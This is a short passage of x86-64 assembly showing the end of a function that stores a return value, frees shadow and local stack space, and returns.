    mov eax, [rax]
    mov [rbp - 8], rax                      ; return value
.loop_end:

.shutdown:
    mov rax, [rbp - 8]                      ; return value

    add rsp, 32                             ; free shadow space
    add rsp, 592                            ; free local variable space

    leave
    ret